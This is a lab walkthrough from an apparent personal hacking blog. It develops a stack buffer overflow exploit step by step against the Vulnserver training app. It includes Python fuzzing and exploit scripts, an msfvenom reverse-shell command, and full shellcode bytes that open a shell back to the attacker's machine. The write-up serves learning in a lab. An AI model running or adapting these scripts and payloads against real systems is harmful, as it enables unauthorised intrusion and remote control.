---
layout: default
title : muzec - 100 Days Of Hacking
---


####  `Day 1`

Buffer Overflow Attacks

Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another. A buffer overflow (or buffer overrun) occurs when the volume of data exceeds the storage capacity of the memory buffer like overloading it with datas to break it down.

`REQUIRED INSTALLATIONS TO SET UP The LAB`

Installations Of Windows 10 Enterprise, Immunity Debugger And Vulnserver On Vmware Player Resources can Be [Found Here For Downloads](https://github.com/fr334aks/100-days-of-Hacking/blob/main/Muzec/Resources.md)

![Image](https://imgur.com/hnUCH5Q.png)

Windows 10 running on Virtualbox Let Get Immunity Debugger and Vulnserver install on the Windows to get started....

![Image](https://imgur.com/VlsWFXM.png)

And we are ready to roll let extract the vulnserver and run it.

![Image](https://imgur.com/bT4cF4X.png)

Note i copy the window IP and the port 9999 is default in vulnserver and we are done with the set up......

`Anatomy Of The Stack`

When we look into the memory stack, we will find 4 main components:

1. Extended Stack Pointer (ESP)

2. Buffer Space

3. Extended Base Pointer (EBP)

4. Extended Instruction Pointer (EIP) / Return Address

![Image](https://imgur.com/3RnwFcW.png)

We really need to focus on the buffer space and the EIP. Buffer space is used as a storage area for memory in some coding languages. With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself. Another way to think of this is that information placed into the buffer space should stop at the EBP.

![Image](https://imgur.com/RyAxTqu.png)

A number of A’s (x41) were sent to the buffer space, but were correctly sanitized. The A’s did not escape the buffer space and thus, no buffer overflow occurred. Now, let’s look at an example of a buffer overflow.

![Image](https://imgur.com/cAAxPg7.png)

Now, the A’s have completely escaped the buffer space and have actually reached the EIP. This is an example of a buffer overflow and how poor coding can become dangerous. If an attacker can gain control of the EIP, he or she can use the pointer to point to malicious code and gain a reverse shell.  which we are planning to do now.

####  `Day 2`

`SPIKING`

Spiking is done to figure out what is vulnerable in an application. We can use a tool called “generic_send_tcp” which is also present on kali linux to generate TCP connections with the vulnerable application.

![Image](https://imgur.com/gEu1Lin.png)

During spiking, in .spk script, we have to try all commands and check at which command the application crashes, in this case, it came out to be TRUN command and .spk script at which the application is crashing looks something like this.

STATS .spk script
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```

TRUN .spk script

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
Ok let try it on the vulnserver we have on our windows 10 to figure out at exactly which command the application is crashing.

![Image](https://imgur.com/AvSkVzT.png)

Using The STATS.spk script we found nothing let try using the TRUN.spk script.

![Image](https://imgur.com/4INRd1D.png)

And it crashed with the “TRUN” command. Once we figure that out we are good to go ahead with that.

####  `Day 3`

`FUZZING`

Fuzzing allows us to send bytes of data to a vulnerable program (in our case, Vulnserver) in growing iterations, in hopes of overflowing the buffer space and overwriting the EIP. First, let’s write a simple Python fuzzing script on our Kali machine.

```
#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
   ```
The code does the following:

1. Sets the variable “buffer” equal to 100 A’s.

2. Performs a while loop, sending each increasing iteration of A’s to Vulnserver and stopping when Vulnserver crashes.

Now let load up Vulnserver and Immunity Debugger as administrator (very important). In Immunity Debugger, click on File > Attach and select vulnserver.exe. Finally, let’s execute our script and see what happen to it boom.

![Image](https://imgur.com/xUwBdUG.png)

Now let check our vulnserver also.

![Image](https://imgur.com/VN8UUwl.png)

Crashed and what is my goals?? my goals is to find a way to control the EIP so i can point our malicious code to it so we can get a shell/root.

![Image](https://imgur.com/XiytejS.png)

This means that we have a buffer overflow vulnerability on our hands and we have proven that we can overwrite the EIP. At this point, we know that the EIP is located somewhere between 1 and 2700 bytes, but we are not sure where it’s located exactly. What we need to do next is figure out exactly where the EIP is located (in bytes) and attempt to control it.

Between the issue i face on Vulnserver is that at times Vulnserver will not crash, but Immunity will pause, which indicates a crash.  In this instance, you may 1) have to hit “Ctrl + C” to stop the fuzzing script and 2) not have all registers overwritten by “A”‘s.  This is okay as long as your program crashed and you have a general idea as to how many bytes were sent.

####  `Day 4`

`FINDING THE OFFSET`

Since we can overwrite the EIP and we know the overwrite occurred between 1 and 2400 bytes (let’s use 3,000 moving forward for a little extra padding), we can use a couple of Ruby tools called Pattern Create and Pattern Offset to find the exact location of the overwrite.

![Image](https://imgur.com/9Q75ffV.png)

Now let locate it on our kali machine.

![Image](https://imgur.com/WeBWczb.png)

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`

Pattern Create allows us to generate a cyclical amount of bytes, based on the number of bytes we specify. We can then send those bytes to Vulnserver, instead of A’s, and try to find exactly where we overwrote the EIP. Pattern Offset will help us determine that soon.

![Image](https://imgur.com/a6H1TkB.png)

Now let modify our code like that below;

```
#!/usr/bin/python 
import sys, socket
 
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1"


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + offset))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```
![Image](https://imgur.com/MYAd2av.png)

Cool we overwrite the program again everything appears as it did before, with Vulnserver crashing and our `TRUN` message appearing on the EAX register. Now, look at the EIP. The value is 386F4337 cool.

If we executed correctly, this value is actually part of our code that we generated with Pattern Create. Let’s try using Pattern Offset to find out.

Now let use the create_offset.rb `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb`

![Image](https://imgur.com/BWBMqld.png)

Cool we got exact match was found at 2003 bytes. This is really awesome lol i feel so cool We can now try to control the EIP, which will be critical later in our exploit.

####  `Day 5`

`OVERWRITING THE EIP`

Boom now that we know the EIP is after 2003 bytes cool let modify our code to confirm if we really have control over the EIP.

```
#!/usr/bin/python 
import sys, socket
 
shellcode = "A" * 2003 + "B" * 4


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```

![Image](https://imgur.com/OmrprZB.png)

So, now the shellcode variable is back to a bunch of A’s and four B’s. What we are doing here is sending 2003 A’s in an attempt to reach, but not to overwrite the EIP. 

Then we are sending four B’s, which should overwrite the EIP with 42424242. Remember, the EIP has a length of four bytes, so if we overwrite successfully, we will be in full control and well on our way to root. Let’s execute the code and have a look

![Image](https://imgur.com/Au86j6a.png)


Boom our EIP have changed to 42424242 that confirm we have totally control over the EIP.

####  `Day 6`

`FINDING BAD CHARACTERS`

So some certain byte characters can cause issues in the development of exploits. We must run every byte through the Vulnserver program to see if any characters cause issues. By default, the null byte(x00) is always considered a bad character as it will truncate shellcode when executed.

To find bad characters in Vulnserver, we can add an additional variable of “badchars” to our code that contains a list of every single hex character. It should look something like this;

```
#!/usr/bin/python 
import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

 
shellcode = "A" * 2003 + "B" * 4 + badchars


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```

Now let save and run it the plans now is to focus on the ESP now let go back to Immunity Debugger and right click on the ESP register and select `Follow in Dump`.

![image](https://imgur.com/2QaTL3c.png)

You should notice a little bit of movement in the bottom left corner of the program. If you look carefully, you should see all of your bytes in order starting with 01, 02, 03, etc and ending with FF.

![Image](https://imgur.com/f8Ii3DI.png)

If a bad character were present, it would seem out of place. Luckily for us, there are no bad characters in the Vulnserver program. Notice below how all of our numbers appear perfect and in order we mean we have no bad characters in the program.

Thanks to the `CyberMentor` for showing some example of bad characters which make it easy for me to understand pics below;

![image](https://imgur.com/yRpYl5P.png)

it show the numbers are not in order some missing numbers which is a bad characters.

![Image](https://imgur.com/2jCkrXw.png)

//NOTE AM USING THE CYBERMENTOR MATERIALS

we would need to mark down every missing character for later shellcode development. However, the only bad character we need to worry about with Vulnserver is x00.


####  `Day 7`

`FINDING THE RIGHT MODULE`

First of all let download mona, what is mona?? Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform). It runs on Immunity Debugger and WinDBG, and requires python 2.7. Although it runs in WinDBG x64, the majority of its features were written specifically for 32bit processes. Download Mona from here `https://github.com/corelan/mona`


![image](https://imgur.com/UM0Aosz.png)


`Installation Instruction`

Immunity Debugger

1. drop mona.py into the 'PyCommands' folder (inside the Immunity Debugger application folder).

![Image](https://imgur.com/BXJlxnS.png)

Local Disk ---> Program Files (x86) ------> Immunity Inc ------> Immunity Debugger -------> PyCommands -----> paste the Mona.py file in it.

Now let confirm if we have our module in immunity debugger ready let try and type `!mona modules` we should get something like that below;

![Image](https://imgur.com/eIqqysW.png)

What we’re looking for is `False` across the board, preferably. That means there are no memory protections present in the module if it `True` it mean we have memory protection on the board. The top module catches my eye immediately. It looks like essfunc.dll is running as part of Vulnserver and has no memory protections. Let’s write down the module and move on to the next step.

What we need to do now is find the opcode equivalent of JMP ESP. We are using JMP ESP because our EIP will point to the JMP ESP location, which will jump to our malicious shellcode that we will inject later. Finding the opcode equivalent means we are converting assembly language into hexcode. There is a tool to do this called nasm_shell.

Now let locate `Nasm_shell`

![Image](https://imgur.com/8AzcYoV.png)


Now let type `JMP ESP`

![image](https://imgur.com/v9l8WE3.png)

Our JMP ESP opcode equivalent is `FFE4`. Now, we can use Mona again to combine this new information with our previously discovered module to find our pointer address. The pointer address is what we will place into the EIP to point to our malicious shellcode. In our Immunity searchbar, let’s type;

`!mona find -s "\xff\xe4" -m essfunc.dll`

![image](https://imgur.com/Yz5Wts3.png)

Cool some really interesting pointers, What we have just generated is a list of addresses that we can potentially use as our pointer. I am going to select the second address, 625011BB.

![image](https://imgur.com/yP7hWlI.png)

![Image](https://imgur.com/RzpwdEd.png)

Now let edit our shell code like that below;

```
#!/usr/bin/python 
import sys, socket
 
shellcode = "A" * 2003 + "\xbb\x11\x50\x62"

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```

Note the pointer number `625011BB` was now going backwards `"\xbb\x11\x50\x62` This is actually called Little Endian.

We have to use the Little Endian format in x86 architecture because the low-order byte is stored in the memory at the lowest address and the high-order byte is stored at the highest address. Thus, we enter our return address in backwards.

Now we need to find our return address in Immunity Debugger. To do this, click on the far right arrow on the top panel of Immunity dubugger.

![Image](https://imgur.com/MrjlX5U.png)

Then search for `625011BB` (or the return address you found), without the quotes, in the `Enter expression to follow` prompt. That should bring up our return address, FFE4, JMP ESP location. Once we found it i hit F2 and the address turn baby blue, indicating that we have set a breakpoint.

![Image](https://imgur.com/exYO9vE.png)

Now let execute our code that we save and see if the breakpoint triggers. If we notice it trigger in Immunity Debugger, we are in the home stretch and ready to develop our exploit now let click on the play before executing our code.

![image](https://imgur.com/TObP4fe.png)

Boom we mean we have a breakpoint and which mean we have total control of the EIP `625011BB` Cool now the next thing for us to do is to generate a shellcode and point it to the shellcode and boom we should get a shell smilling back at us.


####  `Day 8`

`GENERATING SHELLCODE AND GAINING ROOT`

Now time to generate a shellcode with Msfvenom;

`msfvenom -p windows/shell_reverse_tcp LHOST=your.Kali.IP.address LPORT=4444 EXITFUNC=thread -f c -a x86 –platform windows -b "\x00"`

![image](https://imgur.com/1Cg3GTP.png)

```
#!/usr/bin/python 
import sys, socket
 
overflow = ("\xbb\xb3\x2e\xf8\xec\xdb\xc7\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x5e\x12\x03\x5e\x12\x83\x5d\xd2\x1a\x19\x5d\xc3\x59"
"\xe2\x9d\x14\x3e\x6a\x78\x25\x7e\x08\x09\x16\x4e\x5a\x5f\x9b"
"\x25\x0e\x4b\x28\x4b\x87\x7c\x99\xe6\xf1\xb3\x1a\x5a\xc1\xd2"
"\x98\xa1\x16\x34\xa0\x69\x6b\x35\xe5\x94\x86\x67\xbe\xd3\x35"
"\x97\xcb\xae\x85\x1c\x87\x3f\x8e\xc1\x50\x41\xbf\x54\xea\x18"
"\x1f\x57\x3f\x11\x16\x4f\x5c\x1c\xe0\xe4\x96\xea\xf3\x2c\xe7"
"\x13\x5f\x11\xc7\xe1\xa1\x56\xe0\x19\xd4\xae\x12\xa7\xef\x75"
"\x68\x73\x65\x6d\xca\xf0\xdd\x49\xea\xd5\xb8\x1a\xe0\x92\xcf"
"\x44\xe5\x25\x03\xff\x11\xad\xa2\x2f\x90\xf5\x80\xeb\xf8\xae"
"\xa9\xaa\xa4\x01\xd5\xac\x06\xfd\x73\xa7\xab\xea\x09\xea\xa3"
"\xdf\x23\x14\x34\x48\x33\x67\x06\xd7\xef\xef\x2a\x90\x29\xe8"
"\x4d\x8b\x8e\x66\xb0\x34\xef\xaf\x77\x60\xbf\xc7\x5e\x09\x54"
"\x17\x5e\xdc\xfb\x47\xf0\x8f\xbb\x37\xb0\x7f\x54\x5d\x3f\x5f"
"\x44\x5e\x95\xc8\xef\xa5\x7e\x5b\xfb\xaf\x7a\xcb\x06\xaf\x93"
"\x57\x8e\x49\xf9\x77\xc6\xc2\x96\xee\x43\x98\x07\xee\x59\xe5"
"\x08\x64\x6e\x1a\xc6\x8d\x1b\x08\xbf\x7d\x56\x72\x16\x81\x4c"
"\x1a\xf4\x10\x0b\xda\x73\x09\x84\x8d\xd4\xff\xdd\x5b\xc9\xa6"
"\x77\x79\x10\x3e\xbf\x39\xcf\x83\x3e\xc0\x82\xb8\x64\xd2\x5a"
"\x40\x21\x86\x32\x17\xff\x70\xf5\xc1\xb1\x2a\xaf\xbe\x1b\xba"
"\x36\x8d\x9b\xbc\x36\xd8\x6d\x20\x86\xb5\x2b\x5f\x27\x52\xbc"
"\x18\x55\xc2\x43\xf3\xdd\xe2\xa1\xd1\x2b\x8b\x7f\xb0\x91\xd6"
"\x7f\x6f\xd5\xee\x03\x85\xa6\x14\x1b\xec\xa3\x51\x9b\x1d\xde"
"\xca\x4e\x21\x4d\xea\x5a")


shellcode = "A" * 2003 + "\xbb\x11\x50\x62" + "\x90" * 32 + overflow

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```

So we created the exploit and placed the malicious shellcode inside of it. You might notice that we also added `32` `"\x90"` to the shellcode variable. This is standard practice. The x90 byte is also known as the NOP, or no operation. It literally does nothing. However, when developing exploits, we can use it as padding. There are instances where our exploit code can interfere with our return address and not run properly. To avoid this interference, we can add some padding in-between the two items.

Now let run it.

![Image](https://imgur.com/6f9KrKX.png)

Now let check our ncat listener.

![image](https://imgur.com/XHNfRtN.png)

And boom we got shell.....very interesting

####  `Day 9`

`COMPLETING THE BUFFER OVERFLOW PREP IN TRYHACKME`

![Image](https://imgur.com/06CInhs.png)

Resources I use [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)

####  `Day 10`

`GETTING USER IN GATEKEEPER (BUFFER OVERFLOW) IN TRYHACKME`

![Image](https://i.imgur.com/ssIdedp.png)

####  `Day 11`

`GETTING ROOT IN GATEKEEPER (BUFFER OVERFLOW) IN TRYHACKME`

![Image](https://i.imgur.com/EmFl7oW.png)

Some little help from write up....

####  `Day 12`

`WORKING ON GATEKEEPER WRITE UP`

Done writing [Gatekeeper](https://muzec0318.github.io/posts/Gatekeeper.html)

####  `Day 13`
